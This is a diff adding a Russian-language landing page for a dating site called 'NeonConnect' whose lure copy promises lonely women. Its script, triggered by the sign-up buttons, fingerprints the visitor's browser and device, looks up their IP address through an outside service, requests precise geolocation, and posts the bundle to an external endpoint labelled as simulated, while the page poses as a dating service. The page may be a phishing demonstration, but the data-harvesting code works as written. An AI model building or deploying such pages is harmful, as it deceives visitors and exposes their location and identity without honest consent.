@@ -1,0 +1,652 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NeonConnect - Знакомства нового уровня</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #0a0a16;
+            color: #fff;
+            overflow-x: hidden;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Header styles */
+        header {
+            padding: 20px 0;
+            position: relative;
+            z-index: 10;
+        }
+
+        .header-content {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .logo {
+            font-size: 28px;
+            font-weight: 700;
+            text-transform: uppercase;
+            background: linear-gradient(45deg, #ff00cc, #3333ff);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+            text-shadow: 0 0 10px rgba(255, 0, 204, 0.5);
+        }
+
+        .nav-links {
+            display: flex;
+            gap: 30px;
+        }
+
+        .nav-links a {
+            color: #fff;
+            text-decoration: none;
+            font-weight: 500;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .nav-links a:hover {
+            color: #ff00cc;
+            text-shadow: 0 0 10px #ff00cc;
+        }
+
+        .nav-links a::after {
+            content: '';
+            position: absolute;
+            bottom: -5px;
+            left: 0;
+            width: 0;
+            height: 2px;
+            background: #ff00cc;
+            transition: width 0.3s ease;
+        }
+
+        .nav-links a:hover::after {
+            width: 100%;
+        }
+
+        /* Hero section */
+        .hero {
+            position: relative;
+            min-height: 90vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow: hidden;
+            flex: 1;
+            text-align: center;
+        }
+
+        .hero-bg {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background:
+                linear-gradient(rgba(10, 10, 22, 0.7), rgba(10, 10, 22, 0.9)),
+                url('4.jpg');
+            background-size: cover;
+            background-position: center;
+            z-index: -1;
+        }
+
+        .hero-content {
+            max-width: 800px;
+            z-index: 2;
+            margin: 40px 0;
+        }
+
+        .hero h1 {
+            font-size: 48px;
+            margin-bottom: 20px;
+            line-height: 1.2;
+            text-shadow: 0 0 10px rgba(255, 0, 204, 0.7);
+        }
+
+        .hero p {
+            font-size: 18px;
+            margin-bottom: 40px;
+            line-height: 1.6;
+            color: #e0e0e0;
+        }
+
+        .neon-text {
+            color: #ff00cc;
+            text-shadow: 0 0 10px #ff00cc, 0 0 20px #ff00cc, 0 0 30px #ff00cc;
+        }
+
+        /* Main CTA Button */
+        .main-cta-btn {
+            display: inline-block;
+            padding: 20px 60px;
+            background: linear-gradient(45deg, #ff00cc, #3333ff);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 24px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+            text-decoration: none;
+            box-shadow: 0 0 20px rgba(255, 0, 204, 0.5);
+            margin-top: 20px;
+        }
+
+        .main-cta-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 30px rgba(255, 0, 204, 0.7);
+        }
+
+        /* Features section */
+        .features {
+            padding: 80px 0;
+            text-align: center;
+        }
+
+        .section-title {
+            font-size: 36px;
+            margin-bottom: 50px;
+            text-align: center;
+            color: #ff00cc;
+            text-shadow: 0 0 10px rgba(255, 0, 204, 0.5);
+        }
+
+        .features-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 30px;
+        }
+
+        .feature-card {
+            background: rgba(30, 30, 50, 0.7);
+            padding: 30px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            transition: all 0.3s ease;
+            border: 1px solid rgba(255, 0, 204, 0.3);
+        }
+
+        .feature-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 10px 25px rgba(255, 0, 204, 0.3);
+        }
+
+        .feature-icon {
+            font-size: 40px;
+            margin-bottom: 20px;
+            color: #ff00cc;
+            text-shadow: 0 0 10px rgba(255, 0, 204, 0.5);
+        }
+
+        .feature-card h3 {
+            font-size: 22px;
+            margin-bottom: 15px;
+        }
+
+        .feature-card p {
+            color: #b0b0b0;
+            line-height: 1.6;
+        }
+
+        /* CTA section */
+        .cta {
+            padding: 80px 0;
+            text-align: center;
+            background: linear-gradient(rgba(10, 10, 22, 0.9), rgba(10, 10, 22, 0.9)),
+                        url('4.jpg');
+            background-size: cover;
+            background-position: center;
+            background-attachment: fixed;
+        }
+
+        .cta h2 {
+            font-size: 42px;
+            margin-bottom: 20px;
+        }
+
+        .cta p {
+            font-size: 18px;
+            max-width: 700px;
+            margin: 0 auto 30px;
+            line-height: 1.6;
+        }
+
+        .cta-btn {
+            display: inline-block;
+            padding: 15px 40px;
+            background: linear-gradient(45deg, #ff00cc, #3333ff);
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 18px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            text-decoration: none;
+        }
+
+        .cta-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 5px 20px rgba(255, 0, 204, 0.5);
+        }
+
+        /* Modal */
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 1000;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .modal-content {
+            background: rgba(30, 30, 50, 0.95);
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 600px;
+            width: 90%;
+            box-shadow: 0 0 30px rgba(255, 0, 204, 0.5);
+            border: 1px solid rgba(255, 0, 204, 0.5);
+        }
+
+        .modal h2 {
+            color: #ff00cc;
+            margin-bottom: 20px;
+            text-align: center;
+        }
+
+        .modal p {
+            margin-bottom: 15px;
+            line-height: 1.5;
+        }
+
+        .modal-data {
+            background: rgba(20, 20, 40, 0.8);
+            padding: 15px;
+            border-radius: 5px;
+            margin-top: 20px;
+            max-height: 300px;
+            overflow-y: auto;
+        }
+
+        .modal-data pre {
+            white-space: pre-wrap;
+            font-family: monospace;
+            color: #e0e0e0;
+        }
+
+        .close-btn {
+            display: block;
+            margin: 20px auto 0;
+            padding: 10px 30px;
+            background: linear-gradient(45deg, #ff00cc, #3333ff);
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+        }
+
+        .close-btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 0 10px rgba(255, 0, 204, 0.5);
+        }
+
+        /* Footer */
+        footer {
+            padding: 40px 0;
+            text-align: center;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 30px;
+            margin-bottom: 20px;
+        }
+
+        .footer-links a {
+            color: #b0b0b0;
+            text-decoration: none;
+            transition: all 0.3s ease;
+        }
+
+        .footer-links a:hover {
+            color: #ff00cc;
+        }
+
+        .copyright {
+            color: #777;
+            font-size: 14px;
+        }
+
+        /* Animation effects */
+        @keyframes pulse {
+            0% {
+                box-shadow: 0 0 0 0 rgba(255, 0, 204, 0.7);
+            }
+            70% {
+                box-shadow: 0 0 0 15px rgba(255, 0, 204, 0);
+            }
+            100% {
+                box-shadow: 0 0 0 0 rgba(255, 0, 204, 0);
+            }
+        }
+
+        .pulse {
+            animation: pulse 2s infinite;
+        }
+
+        /* Responsive design */
+        @media (max-width: 992px) {
+            .hero h1 {
+                font-size: 36px;
+            }
+
+            .main-cta-btn {
+                padding: 18px 50px;
+                font-size: 20px;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .nav-links {
+                display: none;
+            }
+
+            .hero h1 {
+                font-size: 32px;
+            }
+
+            .section-title {
+                font-size: 28px;
+            }
+
+            .main-cta-btn {
+                padding: 16px 40px;
+                font-size: 18px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Header -->
+    <header>
+        <div class="container">
+            <div class="header-content">
+                <div class="logo">NeonConnect</div>
+                <nav class="nav-links">
+                    <a href="#">Главная</a>
+                    <a href="#">О нас</a>
+                    <a href="#">Премиум</a>
+                    <a href="#">Блог</a>
+                    <a href="#">Контакты</a>
+                </nav>
+            </div>
+        </div>
+    </header>
+
+    <!-- Hero Section -->
+    <section class="hero">
+        <div class="hero-bg"></div>
+        <div class="container">
+            <div class="hero-content">
+                <h1>Найди свою вторую половинку сегодня</h1>
+                <p>Присоединяйся к самому горячему сообществу знакомств. Тысячи одиноких девушек ждут тебя. Не упусти свой шанс!</p>
+
+                <button id="startBtn" class="main-cta-btn pulse">Начать знакомство</button>
+            </div>
+        </div>
+    </section>
+
+    <!-- Features Section -->
+    <section class="features">
+        <div class="container">
+            <h2 class="section-title">Почему выбирают нас</h2>
+            <div class="features-grid">
+                <div class="feature-card">
+                    <div class="feature-icon">🔥</div>
+                    <h3>Горячие анкеты</h3>
+                    <p>Только проверенные профили реальных девушек, готовых к общению</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🔒</div>
+                    <h3>Полная анонимность</h3>
+                    <p>Ваши данные в безопасности. Мы гарантируем конфиденциальность</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">💬</div>
+                    <h3>Мгновенные сообщения</h3>
+                    <p>Общайтесь в реальном времени с помощью нашего чата</p>
+                </div>
+                <div class="feature-card">
+                    <div class="feature-icon">🎯</div>
+                    <h3>Точный поиск</h3>
+                    <p>Находите идеальных партнеров с помощью умного алгоритма</p>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- CTA Section -->
+    <section class="cta">
+        <div class="container">
+            <h2>Присоединяйся к NeonConnect прямо сейчас!</h2>
+            <p>Более 50,000 пользователей уже нашли свою любовь. Не откладывай счастье на потом - зарегистрируйся и начни новую жизнь сегодня!</p>
+            <button id="ctaBtn" class="cta-btn pulse">Начать знакомства</button>
+        </div>
+    </section>
+
+    <!-- Modal for showing collected data -->
+    <div id="dataModal" class="modal">
+        <div class="modal-content">
+            <h2>Сбор данных для персонализации</h2>
+            <p>Для лучшего подбора партнеров нам нужна некоторая информация о вас.</p>
+            <div class="modal-data">
+                <pre id="collectedData">Сбор данных...</pre>
+            </div>
+            <button id="closeModal" class="close-btn">Продолжить</button>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer>
+        <div class="container">
+            <div class="footer-links">
+                <a href="#">Политика конфиденциальности</a>
+                <a href="#">Условия использования</a>
+                <a href="#">Помощь</a>
+                <a href="#">Обратная связь</a>
+            </div>
+            <p class="copyright">© 2023 NeonConnect. Все права защищены.</p>
+        </div>
+    </footer>
+
+    <script>
+        // Elements
+        const startBtn = document.getElementById('startBtn');
+        const ctaBtn = document.getElementById('ctaBtn');
+        const dataModal = document.getElementById('dataModal');
+        const collectedData = document.getElementById('collectedData');
+        const closeModal = document.getElementById('closeModal');
+
+        // Collect user data
+        async function collectUserData() {
+            const data = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                languages: navigator.languages,
+                platform: navigator.platform,
+                cookieEnabled: navigator.cookieEnabled,
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth
+                },
+                viewport: {
+                    width: window.innerWidth,
+                    height: window.innerHeight
+                },
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                // Additional fingerprinting data
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                touchSupport: 'ontouchstart' in window || navigator.maxTouchPoints > 0
+            };
+
+            // Try to get IP address
+            try {
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                data.ip = ipData.ip;
+            } catch (error) {
+                data.ip = 'Не удалось определить';
+            }
+
+            // Try to get geolocation
+            return new Promise((resolve) => {
+                if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(
+                        (position) => {
+                            data.geolocation = {
+                                latitude: position.coords.latitude,
+                                longitude: position.coords.longitude,
+                                accuracy: position.coords.accuracy
+                            };
+                            resolve(data);
+                        },
+                        (error) => {
+                            data.geolocation = {
+                                error: 'Доступ запрещен или недоступен',
+                                code: error.code
+                            };
+                            resolve(data);
+                        },
+                        {
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        }
+                    );
+                } else {
+                    data.geolocation = { error: 'Геолокация не поддерживается' };
+                    resolve(data);
+                }
+            });
+        }
+
+        // Send data to server (simulated)
+        function sendDataToServer(data) {
+            // In a real application, you would send this to your server
+            console.log('Отправка данных на сервер:', data);
+
+            // Simulate API call
+            fetch('https://jsonplaceholder.typicode.com/posts', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data),
+            })
+            .then(response => response.json())
+            .then(result => {
+                console.log('Данные успешно отправлены:', result);
+            })
+            .catch(error => {
+                console.error('Ошибка отправки данных:', error);
+            });
+        }
+
+        // Show modal with collected data
+        function showDataModal(data) {
+            collectedData.textContent = JSON.stringify(data, null, 2);
+            dataModal.style.display = 'flex';
+
+            // Send data to server
+            sendDataToServer(data);
+        }
+
+        // Event listeners
+        startBtn.addEventListener('click', () => {
+            collectUserData().then(showDataModal);
+        });
+
+        ctaBtn.addEventListener('click', () => {
+            collectUserData().then(showDataModal);
+        });
+
+        closeModal.addEventListener('click', () => {
+            dataModal.style.display = 'none';
+        });
+
+        // Close modal when clicking outside
+        dataModal.addEventListener('click', (e) => {
+            if (e.target === dataModal) {
+                dataModal.style.display = 'none';
+            }
+        });
+
+        // Add scroll effect to navbar
+        window.addEventListener('scroll', function() {
+            const header = document.querySelector('header');
+            if (window.scrollY > 50) {
+                header.style.background = 'rgba(10, 10, 22, 0.9)';
+                header.style.backdropFilter = 'blur(10px)';
+            } else {
+                header.style.background = 'transparent';
+                header.style.backdropFilter = 'none';
+            }
+        });
+
+        // Add typing effect to hero title
+        const heroTitle = document.querySelector('.hero h1');
+        const originalText = heroTitle.innerHTML;
+        heroTitle.innerHTML = '';
+
+        let i = 0;
+        const typeWriter = () => {
+            if (i < originalText.length) {
+                heroTitle.innerHTML += originalText.charAt(i);
+                i++;
+                setTimeout(typeWriter, 50);
+            }
+        };
+
+        // Start typing effect after page load
+        window.addEventListener('load', () => {
+            setTimeout(typeWriter, 1000);
+        });
+    </script>
+</body>
+</html>
